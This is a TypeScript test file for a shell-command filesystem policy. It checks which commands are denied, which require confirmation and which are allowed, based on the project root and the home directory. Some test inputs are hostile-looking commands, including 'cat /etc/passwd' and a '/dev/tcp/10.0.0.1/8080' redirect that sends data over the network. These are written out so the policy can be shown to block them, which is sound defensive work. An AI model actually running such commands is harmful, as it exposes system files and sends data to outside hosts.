import { describe, expect, it } from "bun:test";
import { homedir } from "node:os";

import { filesystemPolicy } from "../src/policies/filesystem/policy.ts";
import {
  askReason,
  injectionReason,
} from "../src/policies/filesystem/reasons.ts";
import { ALLOW, ASK, DENY } from "./fixtures/filesystem.ts";
import { decisionOf, policyCheck, reasonOf } from "./helpers/policy.ts";

describe("filesystem policy v2", () => {
  it.each(DENY)("denies %s", (command) => {
    expect(decisionOf(policyCheck(filesystemPolicy, command))).toBe("deny");
  });

  it.each(ASK)("asks on %s", (command) => {
    expect(decisionOf(policyCheck(filesystemPolicy, command))).toBe("ask");
  });

  it.each(ALLOW)("allows %s", (command) => {
    expect(policyCheck(filesystemPolicy, command)).toBeNull();
  });

  it("fail-open: unparseable command allows", () => {
    expect(policyCheck(filesystemPolicy, 'cat "')).toBeNull();
  });

  it("allows reading the repo root from a package cwd (repo-in-$HOME scenario)", () => {
    const repo = `${homedir()}/www/repo`;
    expect(
      policyCheck(filesystemPolicy, "cat ../../README.md", {
        cwd: `${repo}/packages/cli-hook`,
        projectRoot: repo,
      }),
    ).toBeNull();
  });
});

describe("filesystem policy v2 (reasons)", () => {
  it("boundary denies quote the offending token", () => {
    expect(
      reasonOf(policyCheck(filesystemPolicy, "cat /etc/passwd")),
    ).toContain("/etc/passwd");
  });

  it("the injection reason quotes the matched pattern", () => {
    expect(
      reasonOf(
        policyCheck(filesystemPolicy, "echo x > /dev/tcp/10.0.0.1/8080"),
      ),
    ).toContain(injectionReason("/dev/tcp/"));
  });

  it("the /tmp deny reason teaches ./tmp/ at the project root", () => {
    expect(reasonOf(policyCheck(filesystemPolicy, "tee /tmp/x y"))).toContain(
      "./tmp/",
    );
  });

  it("the home-whole ask reason carries only the confirm instruction", () => {
    expect(reasonOf(policyCheck(filesystemPolicy, "ls ~"))).toBe(
      askReason("reading the home directory as a whole", "~"),
    );
  });
});

describe("context", () => {
  it("allows writes inside $HOME and inside projectRoot, denies outside the zone", () => {
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "tee build/x x", {
          cwd: "/proj/sub",
          projectRoot: "/proj",
        }),
      ),
    ).toBeNull();
    // projectRoot carves an allowed zone even outside $HOME
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "tee /workspace/repo/x x", {
          cwd: "/workspace/repo",
          projectRoot: "/workspace/repo",
        }),
      ),
    ).toBeNull();
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "tee /elsewhere/x x", {
          cwd: "/proj/sub",
          projectRoot: "/proj",
        }),
      ),
    ).toBe("deny");
  });
});
